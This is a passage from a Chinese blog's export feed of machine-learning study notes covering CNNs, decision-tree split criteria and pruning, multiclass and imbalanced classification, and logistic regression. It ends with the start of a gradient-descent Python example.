<p>典型的深度学习模型就是很深层的神经网络.对神经网络模型，提高容量的一个简单办法是增加隐层的数目隐层多了，相应的神经元连接权、阈值等参数就会更多.<br>模型复杂度也可通过单纯增加隐层神经元的数目来实现，单隐层的多层前馈网络已具有很强大的学习能力;但从增加模型复杂度的角度来看，增加隐层的数目显然比增加隐层神经元的数目更有效，因为增加隐层数不仅增加了拥有激活函数的神经元数目，还增加了激活函数嵌套的层数.深度学习模型通常有八九层甚至更多隐层.<br>然而，多隐层神经网络难以直接用经典算法(例如标准BP 算法)进行训练，因为误差在多隐层内逆传播时，往往会”发散” (diverge)而不能收敛到稳定状态.</p>
<p>无监督逐层训练(unsupervised layer-wise training)是多隐层网络训练的有效手段，其基本思想是每次训练一层隐结点，训练时将上一层隐结点的输出作为输入，向本层隐结点的输出作为下一层隐结点的输入，这称为”预训练” (pre-training); 在顶训练全部完成后，再对整个网络进行”微调” (fine tuning)训练.比如，各层预训练完成后，再利用BP算法等对整个网络进行训练.</p>
<p>“预训练+微调”的做法可视为将大量参数分组，对每组先找到局部看来比较好的设置，然后再基于这些局部较优的结果联合起来远行全局寻优.这样就在利用了模型大量参数所提供的自由度的同时，有效地节省了训练开销.</p>
<p>另一种节省训练开销的策略是”权共享” (即让一组神经元使用相同的连接权.这个策略在卷积神经网(Convolutional Neural Network，简称CNN)中发挥了重要作用.</p>
<blockquote>
<p>注：卷积与池化：</p>
<p>卷积：</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/卷积1.png" style="zoom:100%;">

<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/卷积2.png" style="zoom:100%;">

<p>池化：</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/池化.png" style="zoom:80%;">
</blockquote>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/CNN.png" style="zoom:80%;">

<p>如上图所示，网络输入是一个32 x 32 的手写数字图像，输出是其识别结果， CNN 复合多个” 卷积层”和”采样层”(池化)对输入信号进行加工，然后在连接层实现与输出目标之间的映射. 每个卷积层都包含多个特征映射(feature map) ， 每个特征映射是一个由多个神经元构成的“平面”，通过卷积滤波器提取输入的特征，一种卷积滤波器提取输入的一种特征。例如，上图中，第一个卷积层由6个特征映射构成，每个特征映射都是一个28*28的神经元阵列。其中每个神经元负责从5 x 5 的区域地通过卷积滤波器提取局部特征；(所以size由32-4=28)<br>采样层亦称为”汇合” (pooling)层， 其作用是基于局部相关性原理进行亚采样，从而在减少数据量的同时保留有用信息. 例如图中第一个采样层有6个14x14的特征映射，其中每个神经元与上一层中对应特征映射的2x2邻域相连，并据此计算输出(所以size由28/2=14)<br>通过复合卷积层和采样层，图中的CNN 将原始图像映射成120 维特征向量， 最后通过一个由84个神经元构成的连接层和输出层连接完成识别任务. CNN 可用BP算法进行训练，但在训练中无论是卷积层还是采样层， 其每一组神经元(即图中的每个” 平面” )都是用相同的连接权，从而大幅减少了需要训练的参数数目。</p>
<p>我们可以从另一个角度来理解深度学习. 其多隐层堆叠、每层对上一层的输出进行处理的机制，可看作是在对输入信号进行逐层加工，从而把初始的、与输出目标之间联系不太密切的输入表示，转化成与输出目标联系更密切的表示(或者说是更高维的信息)，使得原来仅基于最后一层输出映射难以完成的任务成为可能。换言之，通过多层处理，逐渐将初始的” 低层”特征表示转化为” 高层” 特征表示后， 用”简单模型” 即可完成复杂的分类等学习任务由此可将深度学习理解为进行”特征学习” (feature learning) 或” 表示学习” (representation learning) .</p>
<p>以往在机器学习用于现实任务时， 描述样本的特征通常需由人类专家来设计， 这称为” 特征工程”(feature engineering) . 特征的好坏对泛化性能有至关重要的影响，人类专家设计出好特征也并非易事;特征学习则通过机器学习技术自身来产生好特征，这使机器学习向”全自动数据分析”又前进了一步.</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>神经网络领域的主流学术期刊有：<br>Neural Computation<br>Neural Networks<br>IEEE Transactions on Neural Networks and Learning Systems</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>决策树1</title>
    <url>/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/</url>
    <content><![CDATA[<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><p>一般的，一棵决策树包含一个根结点、若干个内部结点和若干个叶结点;叶结点对应于决策结果(底部决策完毕)，其他每个结点则对应于一个属性测试;每个结点包含的样本集合根据属性测试的结果被划分到子结点中(子决策);根结点包含样本全集.从根结点到每个叶结点的路径对应了一个判定测试序列.决策树学习的目的是为了产生一棵泛化能力强，即处理未见示例能力强的决策树，其基本流程遵循简单且直观的”分而治之” (divide-and-conquer) 策略。</p>
<p>决策树的生成是一个递归过程.在决策树基本算法中，有三种情形会导致递归返回:<br>(1) 当前结点包含的样本全属于同一类别，无需划分(已经可以得出是正样本还是负样本);<br>(2) 当前属性集为空，或是所有样本在所有属性上取值相同，无法划分;<br>(3) 当前结点包含的样本集合为空，不能划分.</p>
<p>在第(2)种情形下，我们把当前结点标记为叶结点，井将其类别设定为该结点所含样本最多的类别;<br>在第(3) 种情形下，同样把当前结点标记为叶结点，但将其类别设定为其父结点所含样本最多的类别.<br>注意这两种情形的处理实质不同:情形(2)是在利用当前结点的后验分布，而情形(3)则是把父结点的样本分布作为当前结点的先验分布.</p>
<h2 id="划分选择"><a href="#划分选择" class="headerlink" title="划分选择"></a>划分选择</h2><p>决策树学习的关键是如何选择最优划分属性。</p>
<h3 id="信息增益"><a href="#信息增益" class="headerlink" title="信息增益"></a>信息增益</h3><p>“信息熵” (information entropy)是度量样本集合纯度最常用的一种指标.假定当前样本集合D 中第k类样本所占的比例为Pk (k = 1, 2,. . . , IYI) ，则D的信息熵定义为:(值越小，则D的纯度越高)(在好瓜坏瓜分类中，可以理解为好瓜比例远高于坏瓜比例，或者反过来，因为通过求导可以知道，就是要使得样本比例中某一部分远高于其他；依此，用信息熵最小，就可以知道挑出某样本的“可行率”,若信息熵值越高，则越混乱(平均)，纯度越低)</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/信息熵.png" style="zoom:100%;">



<p>假定离散属性a有V个可能的取值，给分支结点赋予权重IDVI / IDI ，即样本数越多的分支结点的影响越大，于是可计算出用属性a对样本集D进行划分所获得的”信息增益” (information gain)</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/信息增益.png" style="zoom:75%;">

<p>一般而言，信息增益越大(子类的信息熵更小，因此说明这个分类器更能挑)，则意味着使周属性a来进行划分所获得的”纯度提升”越大.因此，我们可用信息增益来进行决策树的划分属性选择。ID3 决策树学习算法(Iterative Dichotomiser 迭代二分器)就是以信息增益为准则来选择划分属性。</p>
<p>通过在每个叶子节点计算使用剩余的所有可用属性会在此处的信息增益，挑出最高的作为此叶子节点的判别属性，就可以获得决策树(ID3决策树)</p>
<h3 id="增益率"><a href="#增益率" class="headerlink" title="增益率"></a>增益率</h3><p>但是信息增益准则也有坏处，信息增益准则对可取值数目较多的属性有所偏好。比如，将所有的样本单独分为一分支，这样每个节点仅有一个样本，分支节点纯度已达最大。然而，这样的决策树显然不具有泛化能力，无法对新样本进行有效预测.</p>
<p>为减少这种偏好可能带来的不利影响，著名的 C4.5 决策树算法不直接使用信息增益，而是使用”增益率” (gain ratio) 来选择最优划分属性.采用与式(4.2) 相同的符号表示，增益率定义为：</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/增益率.png" style="zoom:100%;">

<p>其中:属性a的”固有值”:属性a的可能取值数目越多(即V越大)，则IV(a) 的值通常会越大.</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/固有值.png" style="zoom:100%;">

<p>由于增益率准则对可取值数目较少的属性有所偏好，因此 C4.5决策树算法不直接使用增益率，而是 : 先从候选划分属性中找出信息增益高于平均水平的属性，再从<br>中选择增益率最高的.</p>
<h3 id="基尼指数"><a href="#基尼指数" class="headerlink" title="基尼指数"></a>基尼指数</h3><p>CART 决策树使用”基尼指数” (Gini index)来选择划分属性.数据集D的纯度可用基尼值来度量:</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/基尼值.png" style="zoom:100%;">

<p>直观来说， Gini(D) 反映了从数据集D中随机抽取两个样本其类别标记不一致的概率.因此，Gini(D) 越小，则数据集D 的纯度越高.</p>
<p>属性α 的基尼指数定义为：</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/基尼指数.png" style="zoom:100%;">

<p>于是，CART 决策树在候选属性集合A中，选择那个使得划分后基尼指数最小的属性作为最优划分属性</p>
<a id="more"></a>

<h2 id="剪枝处理"><a href="#剪枝处理" class="headerlink" title="剪枝处理"></a>剪枝处理</h2><p>剪枝(pruning)是决策树学习算法对付”过拟合”的主要手段.在决策树学习中，为了尽可能正确分类训练样本，结点划分过程将不断重复，有时会造成决策树分支过多，这时就可能因训练样本学得”太好”了，以致于把训练集自身的一些特点当作所有数据都具有的一般性质而导致过拟合.因此，可通过主动去掉一些分支来降低过拟合的风险.</p>
<p>决策树剪枝的基本策略有”预剪枝” (prepruning)和”后剪枝”(post”pruning) [Quinlan, 1993].<br>预剪枝是指在决策树生成过程中，对每个结点在划分前先进行估计，若当前结点的划分不能带来决策树泛化性能提升，则停止划分并将当前结点标记为叶结点;<br>后剪枝则是先从训练集生成一棵完整的决策树，然后自底向上地对非叶结点进行考察，若将该结点对应的子树替换为叶结点能带来决策树泛化性能提升，则将该子树替换为叶结点.</p>
<p>注：常见的性能评估的方法<br>1、留出法<br>2、交叉验证法<br>3、自助法</p>
<h3 id="预剪枝"><a href="#预剪枝" class="headerlink" title="预剪枝"></a>预剪枝</h3><p>预页剪枝使得决策树的很多分支都没有”展开“，这降低了过拟合的风险，也显著减少了决策树训练的时间开销和测试时间开销，.但另一方面，有些分支的当前划分虽不能提升泛化性能、甚至可能导致泛化性能暂时下降，但在其基础上进行的后续划分却有可能导致性能显著提高;预剪枝基于”贪心”本质禁止这些分支展开给预剪枝决策树带来了欠拟含的风险。</p>
<h3 id="后剪枝"><a href="#后剪枝" class="headerlink" title="后剪枝"></a>后剪枝</h3><p>后剪枝决策树通常比预剪枝决策树保留了更多的分支. 一般情形下?后剪枝决策树的欠拟合风险很小，泛化性能往往优于预剪枝决策树.但后剪枝过程是在生成完全决策树之后进行的,并且要白底向上地对树中的所有非叶结点进行逐一考察，因此其训练时间开销比未剪枝决策树和预剪枝决策树都要大得多.</p>
<h2 id="连续与缺失"><a href="#连续与缺失" class="headerlink" title="连续与缺失"></a>连续与缺失</h2><h3 id="连续值处理"><a href="#连续值处理" class="headerlink" title="连续值处理"></a>连续值处理</h3><p>下面讨论如何在决策树学习中使用连续属性.</p>
<p>最简单的策略是采用二分法(bi-partition)对连续属性进行处理，这是C4.5决策树算法中采用的机制.</p>
<p>也可以尝试多个位置进行二划分，对每种划分计算其二分后的信息增益，选择能使得信息增益最大的二分点：(这正是基于信息增益划分而改来的)</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/连续值处理的信息增益.png" style="zoom:80%;">

<p>其中Gain(D, a, t) 是样本集D基于划分点t二分后的信息增益. 于是，我们就可选择使Gain(D, a, t) 最大化的划分点.</p>
<p>需注意的是，与离散属性不同，若当前结点划分属性为连续属性，该属性还可作为其后代结点的划分属性.</p>
<p>例如在父结点上使用了”密度&lt;0.381” ，不会禁止在子结点上使用”密度&gt;0.294” .</p>
<h3 id="缺失值处理"><a href="#缺失值处理" class="headerlink" title="缺失值处理"></a>缺失值处理</h3><p>现实任务中常会遇到不完整样本，即样本的某些属性值缺失.如果简单地放弃不完整样本，仅使用无缺失值的样本来进行学习，是对数据信息极大的浪费.</p>
<p>我们需解决两个问题:<br>(1) 如何在属性值缺失的情况下进行划分属性选择?(训练)<br>(2) 给定划分属性,若样本在该属性上的值缺失，如何对样本进行划分?(使用)</p>
<p>定义：对属性a，ρ表示无缺失值样本所占的比例，Pk表示无缺失值样本中第k 类所占的比例，Rv 则表示无缺失值样本中在属性a上取值v的样本所占的比例。基于上述定义，我们可将信息增益的计算式推广为:</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/缺失值信息增益.png" style="zoom:80%;">

<p>Ent信息熵与之前的上面式子相同:</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/信息熵.png" style="zoom:100%;">

<p>对问题(2) ，若样本x在划分属性a上的取值己知,则将x划入与其取值对应的子结点，且样本权值在于结点中保持为ωx.<br>若样本x在划分属性α 上的取值未知，则将x同时划入所有子结点，且样本权值在与属性值av对应的子结点中调整为Rv*ωx ，直观地看，这就是让同一个样本以不同的概率划入到不同的子结点中去.</p>
<p>这就是C4.5决策树算法使用的解决方案。</p>
<h2 id="多变量决策树"><a href="#多变量决策树" class="headerlink" title="多变量决策树"></a>多变量决策树</h2><p>若我们把每个属性视为坐标空间中的一个坐标轴，则d个属性描述的样本就对应了d维空间中的一个数据点，对样本分类则意味着在这个坐标空间中寻找不同类样本之间的分类边界.</p>
<p>分类边界的每一段都是与坐标轴平行的这样的分类边界使得学习结果有较好的可解释性，因为每一段划分都直接对应了某个属性取值.但在学习任务的真实分类边界比较复杂时，必须使用很多段划分才能获得较好的近似;此时的决策树会相当复杂，由于要进行大量的属性测试，预测时间开销会很大：</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/决策树分类边界.png" style="zoom:100%;">

<p>若能使用斜的划分边界，如下图中红色线段所示，则决策树模型将大为简化”多变量决策树” (multivariate decision tree) 就是能实现这样的”斜划分”甚至更复杂划分的决策树.以实现斜划分的多变量决策树为例，在此类决策树中，非叶结点不再是仅对某个属性，而是对属性的线性组合进行测试</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/多变量决策树分类边界.png" style="zoom:100%;">

<p>于是，与传统的”单变量决策树” (univariate decision tree) 不同，在多变量决策树的学习过程中，<br>不是为每个非叶结点寻找一个最优划分属性，而是试图建立一个合适的线性分类器。</p>
<p>例如生成这样的决策树：</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/多变量决策树1.png" style="zoom:100%;">

<p>其对应分类边界就会如下图所示：</p>
<img src="/2020/02/17/%E5%86%B3%E7%AD%96%E6%A0%911/多变量决策树2.png" style="zoom:100%;">

<p>关于线性分类器，前面有谈到，其最基础的思想即是使得均方误差最小化。</p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>决策树学习算法最著名的代表是ID3 [1979, 1986] 、C4.5 [1993] 和CART [1984]. </p>
<p>在信息增益、增益率、基尼指数之外，人们还设计了许多其他的准则用于决策树划分选择，然而有实验研究[1989]表明，这些准则虽然对决策树的尺寸有较大影响，但对泛化性能的影响很有限.</p>
<p>剪枝方法和程度对决策树泛化性能的影响相当显著，有实验研究表明[1989]，在数据带有噪声时通过剪枝甚至可将决策树的泛化性能提高25%.</p>
<p>多变量决策树算法主要有OC1 [1994] 和[Brodley and Utgoff,1995] 提出的一系列算法.OC1 先贪心地寻找每个属性的最优权值，在局部优化的基础上再对分类边界进行随机扰动以试图找到更好的边界; [Brodley and Utgoff, 1995] 则直接引入了线性分类器学习的最小二乘法，还有一些算法试图在决策树的叶结点上嵌入神经网络，以结合这两种学习机制的优势，例如”感知机树” (Perceptron tree) [Utgoff, 1989b] 在决策树的每个叶结点上训练一个感知机，而[Guo and Gelfand, 1992] 则直接在叶结点上嵌入多层神经网络.</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>相机运动方向检测2</title>
    <url>/2020/02/13/%E7%9B%B8%E6%9C%BA%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91%E6%A3%80%E6%B5%8B2/</url>
    <content><![CDATA[<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>关于之前开的相机运动方向检测的代码实现，目前已经大致完成</p>
<img src="/2020/02/13/%E7%9B%B8%E6%9C%BA%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91%E6%A3%80%E6%B5%8B2/result_mainPage.png" style="zoom:100%;">

<p>测试视频，效果如下：</p>
<a id="more"></a>

<p>测试视频1：</p>
<img src="/2020/02/13/%E7%9B%B8%E6%9C%BA%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91%E6%A3%80%E6%B5%8B2/result1.gif" style="zoom:100%;">

<p>原本总共有五个测试视频，由于服务器速度较慢，如果全放上来会加载很慢，因此就放一个上来</p>
<h3 id="测试数据来源"><a href="#测试数据来源" class="headerlink" title="测试数据来源"></a>测试数据来源</h3><p>关于测试的视频来源，为 Hopkins 155 数据库。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>线性模型2</title>
    <url>/2020/02/12/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B2/</url>
    <content><![CDATA[<h2 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h2><h3 id="线性模型中的多分类学习"><a href="#线性模型中的多分类学习" class="headerlink" title="线性模型中的多分类学习"></a>线性模型中的多分类学习</h3><p>现实中常遇到多分类学习任务.有些二分类学习方法可直接推广到多分类，但在更多情形下，我们是基于一些基本策略，利用二分类学习器来解决多分类问题。</p>
<p> 多分类学习的基本思路是”拆解法”，即将多分类任务拆为若干个二分类任务求解.具体来说，先对问题进行拆分，然后为拆出的每个二分类任务训练一个分类器;在测试时，对这些分类器的预测结果进行集成以获得最终的多分类结果.这里的关键是如何对多分类任务进行拆分，以及如何对多个分类器进行集成.最经典的拆分策略有三种. “一对一” (One vs. One，简称OvO) 、”一对其余” (One vs. Rest ，简称OvR)和”多对多” (Many vs. Many，简称MvM)。</p>
<h4 id="OvO与OvR"><a href="#OvO与OvR" class="headerlink" title="OvO与OvR"></a>OvO与OvR</h4><p>OvO 将N 个类别两两配对，从而产生N(N 一1)/2 个二分类任务，最终结果可通过投票产生。OvR 则是每次将一个类的样例作为正例、所有其他类的样例作为反例来训练N个分类器.在测试时若仅有一个分类器预测为正类，则对应的类别标记作为最终分类结果。若有多个分类器预测为正类，则通常考虑各分类器的预测置信度，选择置信度最大的类别标记作为分类结果。下图为OvO与OvR的示意图：</p>
<img src="/2020/02/12/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B2/OvO与OvR.png" style="zoom:80%;">



<p>OvR只需训练N个分类器， 而OvO需训练N(N - 1)/2 个分类器， 因此， OvO的存储开销和测试间开销通常比OvR 更大. 但在训练时，OvR的每个分类器均使用全部训练样例，而OvO的每个分类器仅用到两个类的样例，因此，在类别很多时，OvO的训练时间开销通常比OvR更小. 预测性能在多数情形下两者差不多.</p>
<h4 id="MvM"><a href="#MvM" class="headerlink" title="MvM"></a>MvM</h4><p>MvM 是每次将若干个类作为正类，若干个其他类作为反类. MvM的正、反类构造必须有特殊的设计，不能随意选取.最常用的MvM技术是”纠错输出码” (Error CorrectingOutput Codes，简称ECOC).它尽可能在解码过程中具有容错性. </p>
<h5 id="Error-CorrectingOutput-Codes-ECOC"><a href="#Error-CorrectingOutput-Codes-ECOC" class="headerlink" title="Error CorrectingOutput Codes(ECOC)"></a>Error CorrectingOutput Codes(ECOC)</h5><p>ECOC 工作过程主要分为两步:<br>编码:对N个类别做M次划分， 每次划分将一部分类别划为正类，一部分划为反类，从而形成一个二分类训练集;这样一共产生M个训练集，可训练出M个分类器.<br>解码:M个分类器分别对测试样本进行预测，这些预测标记组成一个编码.将这个预测编码与每个类别各自的编码进行比较，返回其中距离最小的类别作为最终预测结果.</p>
<img src="/2020/02/12/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B2/ECOC.png" style="zoom:80%;">

<p>ECOC 编码示意图”+1” 、”-1” 分别表示学习器f将该类样本作为正、反例;三元码中”0” 表示f不使用该类样本<br>一般来说，对同一个学习任务， ECOC 编码越长，纠错能力越强.然而，编码越长，意味着所需训练的分类器越多，计算、存储开销都会增大;另外，对有限类别数，可能的组合数目是有限的。</p>
<p>对OvR 、MvM 来说，由于对每个类进行了相同的处理，其拆解出的二分类任务中类别不平衡的影响会相互抵消，因此通常不需专门处理.</p>
<h3 id="类别不平衡问题-class-imbalance"><a href="#类别不平衡问题-class-imbalance" class="headerlink" title="类别不平衡问题(class-imbalance)"></a>类别不平衡问题(class-imbalance)</h3><p>如果不同类别的训练样例数目稍有差别，通常影响不大，但若差别很大，则会对学习过程造成困扰.例如有998个反例，但正例只有2个，那么学习方法只需返回一个永远将新样本预测为反例的学习器，就能达到99.8%的精度;然而这样的学习器往往没有价值，因为它不能预测出任何正例.</p>
<a id="more"></a>

<h4 id="再缩放"><a href="#再缩放" class="headerlink" title="再缩放"></a>再缩放</h4><p>再缩放，又称为再平衡，是不平衡学习的一个基本策略。</p>
<p>通常在二分类情况下，我们实际上是在使用预测出的y值与阈值比较从而获得分类的结果：当y&gt;0.5，我们称之为正例，y&lt;=0.5，我们称之为反例。即：y/(1-y)&gt;1为正例。<br>再缩放的基本思想，即正例： y/(1-y)&gt;(m+)/(m-) ；m+为正样本数量 ，m-为负样本数量。因此运用到实际预测当中时，有：f= y/(1-y) * (m+)/(m-) </p>
<p>但是，我们未必能有效地基于训练集观测几率来准确地推断出真实几率.因此现有技术大体上有三类做法:第一类是直接对训练集里的反类样例进行”欠采样” (undersampling) ，即去除一些反倒使得正、反例数日接近然后再进行学习;<br>第二类是对训练集里的正类样例进行”过来样” (oversampling) ，即增加一些正例使得正、反例数目接近，然后再进行学习;<br>第三类则是直接基于原始训练集进行学习，但在用训练好的分类器进行预测时，将式(3.48)嵌入到其决策过程中，称为”阔值移动” (threshold-moving).</p>
<p>欠采样法的时间开销通常远小于过采样法，因为前者丢弃了很多反例，使得分类器训练集远小子初始训练集，而过来样法增加了很多正例，其训练集大于初始训练集.<br>需注意的是，过采样法不能简单地对初始正例样本进行重复来样，否则会招致严重的过拟合，过采样法的代表性算法SMOTE是通过对训练集里的正例进行插值来产生额外的正例.<br>另一方面，欠采样法若随机丢弃反例可能丢失一些重要信息;欠采样法的代表性算法EasyEnsemble则是利用集成学习机制，将反例划分为若干个集合供不同学习器使用，这样对每个学习器来看都进行了欠采样，但在全局来看却不会丢失重要信息.</p>
<p>最后值得一提的是，”再缩放”也是”代价敏感学习” (cost-sensitive learning) 的基础。代价敏感学习为不同类的错误设定了不同的权值，其错误率计算为：<br><img src="/2020/02/12/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B2/代价敏感学习错误率.png" style="zoom:80%;"><br>cost即为被预测为不同类预测错误时所需付出的代价。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>线性模型1</title>
    <url>/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/</url>
    <content><![CDATA[<h2 id="线性模型的基本形式"><a href="#线性模型的基本形式" class="headerlink" title="线性模型的基本形式"></a>线性模型的基本形式</h2><img src="/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/基本形式.png" style="zoom:100%;">

<h3 id="线性回归"><a href="#线性回归" class="headerlink" title="线性回归"></a>线性回归</h3><p>“线性回归” (linear regression)试图学得一个线性模型以尽可能准确地预测实值输出标记。通常使用均方误差，亦称平方损失，来作为性能度量，试图使均方误差最小。</p>
<p>基于均方误差最小化来进行模型求解的方法称为”最小二乘法” (least suare method). 在线性回归中，最小二乘法就是试图找到一条直线，使所有样本到直线上的欧氏距离之和最小.(最小二乘法用途很广，不仅限于线性回归)</p>
<p>在求解使得均方差最小化的过程中，称为线性回归模型对最小二乘的参数估计。我们可对其均方差求导，另求导式为零，则可得w与b的最优解。</p>
<p>然而现实中，往往会求出多个解。这时选择哪一个作为解进行输出，则由算法的归纳偏好决定。常见的做法是引入正则化(regularization) 项.如，假设我们认为示例所对应的输出标记是在指数尺度上变化，则可以使得 lny = wx +b 。这就是”对数线性回归” (log-linear regression)。</p>
<p>更一般地，考虑单调可微函数g(.) ， 令 g(y) = wx + b , 这样得到的模型称为” 广义线性模型” (generalized linear model) ，其中函数g() 称为”联系函数” (link function)。</p>
<h3 id="对数几率回归"><a href="#对数几率回归" class="headerlink" title="对数几率回归"></a>对数几率回归</h3><p>若要做的是分类任务，只需找一个单调可做函数将分类任务的真实标记y与线性回归模型的预测值联系起来。</p>
<img src="/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/单位阶跃函数与对数几率函数.png" style="zoom:100%;">

<p>上图中，左式是对数几率函数；右式是单位阶跃函数</p>
<p>从图3.2 可看出，单位阶跃函数不连续，因此不能直接使用，于是我们使用另外的单调可微的连续函数：对数几率函数。</p>
<p>对数几率函数是一种”Sigmoid 函数” (Sigmoid 函数即形似s的函数)，它将z值转化为一个接近0或1 的y值并且其输出值在z=0 附近变化很陡.将对数几率函数作为g()使用于广义线性模型 g(y) = wx + b 中即可将分类标记与回归模型联系起来。</p>
<p>这个方法是在用线性回归模型的预测结果去逼近真实标记的对数几率，因此，其对应的模型称为”对数几率回归”，虽然它的名字是”回归”，但实际是一种分类学习方法。</p>
<p>在其求解中，我们可通过”极大似然法” (maximum likelihood method)来估计ω和b。即令每个样本属于其真实标记的概率越大越好。最终得出的式子是关于β 的高阶可导连续凸函数，根据凸优化理论，经典的数值优化算法如梯度下降法(gradient descent method) 、牛顿法(Newton method)等都可求得其最优解。</p>
<h4 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h4><p>有一可微分的函数。这个函数就代表着一座山。我们的目标就是找到这个函数的最小值，也就是山底。根据之前的场景假设，最快的下山的方式就是找到当前位置最陡峭的方向，然后沿着此方向向下走，对应到函数中，就是找到给定点的梯度 ，然后朝着梯度相反的方向，就能让函数值下降的最快。因为梯度的方向就是函数之变化最快的方向。所以，我们重复利用这个方法，反复求取梯度，最后就能到达局部的最小值，这就类似于我们下山的过程。而求取梯度就确定了最陡峭的方向，也就是测量下降方向的手段。</p>
<p>在单变量的函数中，梯度其实就是函数的微分，代表着函数在某个给定点的切线的斜率；在多变量函数中，梯度是一个向量，向量有方向，梯度的方向就指出了函数在给定点的上升最快的方向。</p>
<a id="more"></a>

<img src="/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/梯度下降例子.png" style="zoom:90%;">

<p>如上，梯度就是分别对每个变量进行微分，梯度是一个向量。 </p>
<img src="/2020/02/10/%E7%BA%BF%E6%80%A7%E6%A8%A1%E5%9E%8B1/梯度下降.png" style="zoom:90%;">

<h5 id="模拟梯度下降的python代码"><a href="#模拟梯度下降的python代码" class="headerlink" title="模拟梯度下降的python代码"></a>模拟梯度下降的python代码</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据集大小 即20个数据点</span></span><br><span class="line">m = <span class="number">20</span></span><br><span class="line"><span class="comment"># x的坐标以及对应的矩阵</span></span><br><span class="line">X0 = ones((m, <span class="number">1</span>))  <span class="comment"># 生成一个m行1列的向量，也就是x0，全是1</span></span><br><span class="line">X1 = arange(<span class="number">1</span>, m+<span class="number">1</span>).reshape(m, <span class="number">1</span>)  <span class="comment"># 生成一个m行1列的向量，也就是x1，从1到m</span></span><br><span class="line">X = hstack((X0, X1))  <span class="comment"># 按照列堆叠形成数组，其实就是样本数据</span></span><br><span class="line"><span class="comment"># 对应的y坐标</span></span><br><span class="line">Y = array([</span><br><span class="line">    <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>,</span><br><span class="line">    <span class="number">11</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span></span><br><span class="line">]).reshape(m, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 学习率</span></span><br><span class="line">alpha = <span class="number">0.01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义代价函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cost_function</span><span class="params">(theta, X, Y)</span>:</span></span><br><span class="line">    diff = dot(X, theta) - Y  <span class="comment"># dot() 数组需要像矩阵那样相乘，就需要用到dot()</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span>/(<span class="number">2</span>*m)) * dot(diff.transpose(), diff)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义代价函数对应的梯度函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_function</span><span class="params">(theta, X, Y)</span>:</span></span><br><span class="line">    diff = dot(X, theta) - Y</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span>/m) * dot(X.transpose(), diff)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 梯度下降迭代</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span><span class="params">(X, Y, alpha)</span>:</span></span><br><span class="line">    theta = array([<span class="number">1</span>, <span class="number">1</span>]).reshape(<span 